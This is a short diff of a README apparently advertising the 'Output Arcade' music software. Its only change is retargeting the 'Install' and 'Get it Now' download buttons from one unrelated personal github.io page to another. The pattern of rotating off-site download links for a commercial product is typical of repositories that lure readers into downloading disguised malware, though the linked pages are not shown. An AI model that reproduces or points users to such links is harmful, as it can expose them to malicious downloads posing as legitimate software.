@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://a4-glent.github.io/.github/outputArcade)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poxmell.github.io/.github/outputArcade)
 
 </div>
 
@@ -81,7 +81,7 @@ Output Arcade's fundamental insight is treating loops as instruments rather than
 
 <p align="center">
 
-[![Get it Now Output Arcade](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/outputArcade)
+[![Get it Now Output Arcade](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/outputArcade)
 
 </p>
 
